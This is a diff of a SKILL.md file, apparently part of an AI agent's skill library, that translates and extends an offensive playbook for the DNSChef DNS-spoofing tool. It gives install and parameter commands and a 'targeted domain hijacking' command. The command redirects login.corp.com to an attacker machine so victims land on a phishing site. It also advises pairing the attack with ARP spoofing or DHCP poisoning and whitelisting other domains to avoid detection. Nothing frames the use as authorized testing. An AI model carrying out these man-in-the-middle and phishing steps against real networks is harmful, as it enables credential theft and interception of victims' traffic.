@@ -2,38 +2,42 @@
 name: dnschef-spoof
 description: "DNSChef: targeted DNS hijacking. Signals: man-in-the-middle, MITM, redirect all domains to attacker, spoof only specified domains, real resolution whitelist."
 zh-signals: "DNSChef: 定向域名劫持。信号:中间人,mitm,全域名指向攻击机,只伪造指定域,真实解析白名单。"
+when-to-use: >-
+  Use when conducting a man-in-the-middle attack and you need to redirect all or
+  selected domains to an attacker-controlled IP via DNS spoofing; pair with ARP
+  spoofing or DHCP poisoning and whitelist real domains to reduce exposure.
 ---
 
 # DNSChef
 
-- 攻击大类:C40 嗅探与中间人攻击
-- 上游仓库:https://github.com/iphelix/dnschef
-- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
+- Upstream Repository: https://github.com/iphelix/dnschef
+- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-pip install dnschef 或 git clone
+pip install dnschef or git clone
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `dnschef.py --fakeip 10.8.0.2 --interface 0.0.0.0` | 全域名指向攻击机 |
-| `--fakedomains corp.com` | 只伪造指定域 |
-| `--truedomains update.com` | 真实解析白名单 |
-| `-q` | 静默 |
+| `dnschef.py --fakeip 10.8.0.2 --interface 0.0.0.0` | Redirect all domains to the attacker machine |
+| `--fakedomains corp.com` | Spoof only the specified domains |
+| `--truedomains update.com` | Real resolution whitelist |
+| `-q` | Quiet |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 定向域名劫持
+### Targeted domain hijacking
 
 ```bash
 sudo python dnschef.py --fakeip 10.8.0.2 --fakedomains login.corp.com -i 0.0.0.0
-# 目标 DNS 指向本机后,其访问 login.corp.com 即入钓鱼站
+# Once the target's DNS points at this machine, visiting login.corp.com lands on the phishing site
 ```
 
-## 注意事项
+## Notes
 
-配合 ARP 欺骗或 DHCP 污染使用;--truedomains 保证其余域名正常解析降低暴露。
+Works together with ARP spoofing or DHCP poisoning; --truedomains keeps the remaining domains resolving normally to reduce exposure.
